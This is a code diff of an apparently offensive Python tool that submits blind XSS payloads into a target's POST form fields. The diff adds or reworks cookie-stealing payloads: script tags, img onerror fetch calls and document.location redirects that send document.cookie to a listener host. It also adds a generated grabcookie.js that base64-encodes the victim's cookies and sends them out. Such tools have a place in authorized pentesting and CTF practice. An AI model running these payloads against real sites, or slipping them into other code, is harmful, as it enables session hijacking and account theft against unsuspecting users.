@@ -17,12 +17,24 @@ Works best with https://github.com/4wayhandshake/simple-http-server
 
 default_payloads = [
     {
-        "name": "scriptdocloc",
-        "payload": "<script>document.location='#HOST#/?#LBL#'</script>"
+        "name": "regularlink",
+        "payload": "#HOST#/?#LBL#"
     },
     {
-        "name": "imgonerrordocloc",
-        "payload": "<img src=x onerror=\"document.location='#HOST#/?#LBL#'\">"
+        "name": "htmlanchortag",
+        "payload": "<a>#HOST#/?#LBL#</a>"
+    },
+    {
+        "name": "markdownlink",
+        "payload": "[link](#HOST#/?#LBL#)"
+    },
+    {
+        "name": "markdownimage",
+        "payload": "![alttext](#HOST#/?#LBL#)"
+    },
+    {
+        "name": "append",
+        "payload": "<script>document.cookie</script>"
     },
     {
         "name": "newimagesrc",
@@ -30,20 +42,27 @@ default_payloads = [
     },
     {
         "name": "scriptsrc",
-        "payload": "<script src='#HOST#/?#LBL#&b64='+document.cookie</script>"
+        "payload": "<script src='#HOST#/?#LBL#&b64='+document.cookie></script>"
     },
-
     {
         "name": "extscript",
         "payload": '<script src="#HOST#/grabcookie.js?#LBL#"></script>'
     },
     {
         "name": "imgonerrorfetchcookie",
-        "payload": '<img src=x onerror=\"fetch("#HOST#/?#LBL#&b64="+document.cookie);\">'
+        "payload": '<img src=x onerror=\"fetch(\'#HOST#/?#LBL#&b64=\'+document.cookie)\">'
     },
     {
         "name": "imgonerrorfetch",
-        "payload": '<img src=x onerror=fetch("#HOST#/?#LBL#");>'
+        "payload": '<img src=x onerror=\"fetch(\'#HOST#/?#LBL#\')\">'
+    },
+    {
+        "name": "scriptdocloc",
+        "payload": "<script>document.location='#HOST#/?#LBL#'</script>"
+    },
+    {
+        "name": "imgonerrordocloc",
+        "payload": "<img src=x onerror=\"document.location='#HOST#/?#LBL#'\">"
     },
     {
         "name": "scriptdocloccookie",
@@ -97,8 +116,22 @@ DEFAULT_UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Ge
 DEBUG = True
 log_http_file = os.path.join(os.getcwd(), 'debug.log')
 log_html_file = os.path.join(os.getcwd(), 'debug.html')
+log_payloads_file = os.path.join(os.getcwd(), 'debug.lst')
+grabcookie_file = os.path.join(os.getcwd(), 'grabcookie.js')
 
 fields = FIELDS.split(',')
+
+grabcookie_javascript_template = r'''
+function urlSafeBase64Encode(data) {
+  var encoded = btoa(data)
+    .replace(/\+/g, '-')
+    .replace(/\//g, '_')
+    .replace(/=/g, '');
+  return encoded;
+}
+
+new Image().src='#HOST#/grabcookie?b64='+urlSafeBase64Encode(document.cookie)
+'''
 
 if PAYLOADS_FILE is None:
     payloads = default_payloads
@@ -136,7 +169,8 @@ def substitute_post_body(post_body, fields, payload_template, lbl_prefix):
     for field in fields:
         if field in parsed_body:
             _payload = payload_template.replace('#LBL#',lbl_prefix+field.lower())
-            parsed_body[field] = [_payload]
+            #print(f'Appending {field}={parsed_body[field]} with {[_payload]}')
+            parsed_body[field] += [_payload]
     # Re-encode the dictionary back into x-www-form-urlencoded format
     return urllib.parse.urlencode(parsed_body, doseq=True)
 
@@ -146,14 +180,22 @@ if __name__ == "__main__":
     i = 0
     N = len(payloads) * len(escapes)
 
-    print(f'Submitting {N} blind XSS payloads to {TARGET}')
+    print(f'\nSubmitting {N} blind XSS payloads to {TARGET}\n')
+    
+    with open(grabcookie_file,'w') as f:
+        print(f'Writing {grabcookie_file} ... be sure to move this to http listener root!')
+        f.write(grabcookie_javascript_template.replace('#HOST#', LOCAL))
 
     if DEBUG:
-        print('Debug mode is ENABLED: writing payloads into debug.html and HTTP into debug.log')
+        print('Debug mode is ENABLED: writing \n - payloads into debug.html \n - HTTP into debug.log \n - raw payloads into debug.lst')
         with open(log_html_file, 'w') as outfile:
             outfile.write(f"<html><body>\n")
         with open(log_http_file, 'w') as logfile:
             logfile.write(f'Logging XSS attempts to {TARGET}\n---------------------------------\n')
+        with open(log_payloads_file, 'w') as payloadsfile:
+            payloadsfile.write(f"PAYLOADS:\n")
+            
+    print('   ')
 
     for p in payloads:
         payload_name = p['name']
@@ -162,6 +204,8 @@ if __name__ == "__main__":
         if DEBUG:
             with open(log_html_file, 'a') as outfile:
                 outfile.write(f"<p>{payload_value.replace('#LBL#',f'payload={payload_name}&f=debug')}</p>\n")
+            with open(log_payloads_file, 'a') as payloadsfile:
+                payloadsfile.write(f"{payload_value.replace('#LBL#',f'payload={payload_name}&f=debug')}\n")
 
         for e in escapes:
             payload = f'{escapes[e]}{payload_value}'
